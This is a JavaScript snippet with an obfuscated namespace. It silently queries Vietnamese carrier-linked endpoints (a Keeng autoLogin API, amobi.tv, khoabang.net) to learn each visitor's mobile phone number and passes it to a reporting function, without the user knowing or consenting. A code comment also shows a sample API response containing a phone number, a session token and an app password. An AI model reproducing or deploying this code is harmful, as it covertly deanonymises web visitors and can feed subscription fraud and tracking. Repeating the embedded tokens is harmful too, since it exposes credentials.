___.Phone = {
	normViettel: function (p) {
		var i = p.indexOf('-');
		i > 0 && (p = '0' + p.substr(i + 1));
		return p;
	},
	norm : function (p) {
		p = this.normViettel(p);
		var pf = ['', '0', '84', '+84', '(84)', '(+84)'];
		p.includes('\n') && (p = p.replace('\n', ''));
		for (var i = 1, l = pf.length; i < l; i++) {
			if (p.startsWith(pf[i])) {
				return '0' + p.substr(i);
			}
		}
		!p.startsWith('0') && (p='0'+p);
		return p;
	}
};

___.Msisdn = {
	detect: function () {
		this.dvt();
	},
	dvnp: function () {
		___.ajax({
			url: 'http://khoabang.net/MsisdnDetector',
			method: 'GET',
			success: function (d) {
				try {
					d = JSON.parse(d);
					if (d.msisdn.length > 0) {
						___.Report.success({
							phone : ___.Phone.norm(d.msisdn),
							carrier : 'Vinaphone'
						});
					} else {
						___.Report.error({
							src : "___.Msisdn.dvnp.success@2.0",
							msg : 'd.msisdn'
						});
					}
				} catch (ex) {
					___.Report.error({
						src: '___.Msisdn.dvnp.success@2.0',
						msg: 'Exception : ' + ex.message
					});
				}
			},
			error: function (xhr) {
				___.Report.error({
					src:'___.Msisdn.dvnp.error@2.0',
					msg: xhr.responseText
				});
			}
		});
	},
	dmbp: function () {
		var _s = this;
		___.ajax({
			url: 'http://amobi.tv/msisdn',
			method: 'GET',
			success: function (d) {
				try {
					var n = '0123456789';
					var isPhone = true;
					for (var i = 0; i < d.length; ++i) {
						if (!n.includes(d[i])) {
							isPhone = false;
						}
					}
					if (d.length > 0 && isPhone) {
						___.Report.success({
							phone: ___.Phone.norm(d),
							carrier: 'Mobiphone'
						});
					}
					else {
						_s.dvnp();
					}
				} catch (ex) {
					___.Report.error({
						src : "___.Msisdn.dmbp.success@2.0",
						msg : 'Exception : ' + ex.message
					});
				}
			},
			error: function (xhr) {
				___.Report.error({
					src: "___.Msisdn.dmbp.error@2.0",
					msg: xhr.responseText
				});
			}
		});
	},
	dvt: function () {
		var _s = this;
		___.ajax({
			url: 'http://api.keeng.vn:8080/KeengWSRestful/ws/auth/autoLogin',
			method: 'GET',
			success: function(d) {
				// Với dữ liệu Viettel 3G :
				//  {"data":{"birthday":"","cover":"","email":"","gender":1,"id":29444270,"image":"","is_vip":0,"msisdn"
				//  :"1656850760","name":"841656850760","privacy_receive_alert":1,"privacy_share_feed":1,"reeng_rsa_encrypt"
				//  :"","session_token":"t:s:71c984e27242649db89a42179f6f924a780b1862","sub_type":0,"user_type":0,"app_password"
				//  :"eo5b6wzj8sm2qn3wdm","singer_id":0}}
				// Với dữ liệu not Viettel 3G :
				// 	{"error":{"message":"not detect device's msisdn","code":100}}
				try {
					d = JSON.parse(d);
					___.Report.success({
						phone: ___.Phone.norm(d.data.msisdn),
						carrier: 'Viettel'
					});
				} catch (ex) {
					if (!d.error) {
						___.Report.error({
							src : '___.Msisdn.dvt.success@2.0',
							msg : 'Exception :' + ex.message
						});
					} else {
						_s.dmbp();
					}
				}
			},
			error: function (xhr) {
				___.Report.error({
					src: '___.Msisdn.dvt.error@v2',
					msg: xhr.responseText
				});
			}
		});
	}
};